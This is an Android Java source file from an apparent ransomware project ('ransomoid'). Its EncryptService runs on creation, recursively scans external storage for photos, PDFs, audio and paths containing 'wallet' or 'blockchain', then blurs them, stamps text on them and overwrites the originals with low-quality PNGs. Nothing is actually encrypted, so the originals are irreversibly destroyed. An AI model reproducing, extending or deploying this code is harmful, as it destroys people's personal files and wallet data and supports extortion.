package falezza.fabio.ransomoid.services;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Environment;
import android.os.IBinder;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Random;

import falezza.fabio.ransomoid.utils.ImageProcessor;

public class EncryptService extends Service {

    private static final String[] imgExtensions = {
            ".jpg", ".jpeg", ".png", ".JPG", ".PNG",
            ".JPEG", ".pdf", ".PDF", ".mp3", ".MP3",
            ".WAV", ".wav",
            "wallet", "blockchain", ".ogg", ".thumbnails"
    };

    private static final String[] excludeEstensions = {"Android/data"};

    Random random;
    ArrayList<File> imgList;

    @Override
    public void onCreate() {
        super.onCreate();
        this.imgList = this.getImages(Environment.getExternalStorageDirectory());
        this.encrypt();
    }

    private void encrypt() {
        try {
            ImageProcessor imgProcessor = ImageProcessor.getInstance(getApplicationContext());
            for (File img : this.imgList) {
                if (!isEncrypted(img)) {
                    imgProcessor.setFile(img);
                    imgProcessor.blur();
                    imgProcessor.drawText();
                    File newFile = new File(img.getPath());
                    FileOutputStream stream = new FileOutputStream(newFile, false);
                    imgProcessor.getImage().compress(Bitmap.CompressFormat.PNG, 50, stream);
                    stream.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // given a directory recursively get all images file.
    private ArrayList<File> getImages(File dir) {
        ArrayList<File> files = new ArrayList<>();
        for (File file : dir.listFiles()) {
            if (file.isDirectory()) {
                files.addAll(this.getImages(file));
            } else {
                boolean isImage = false;
                for (String extension : imgExtensions) {
                    if (file.getPath().contains(extension)) {
                        isImage = true;
                        break;
                    }
                }
                for (String extension : excludeEstensions) {
                    if (file.getPath().contains(extension)) {
                        isImage = false;
                        break;
                    }
                }
                if (isImage) {
                    files.add(file);
                }
            }
        }
        return files;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean isEncrypted(File file) {
        return file.getPath().contains(".enc");
    }
}
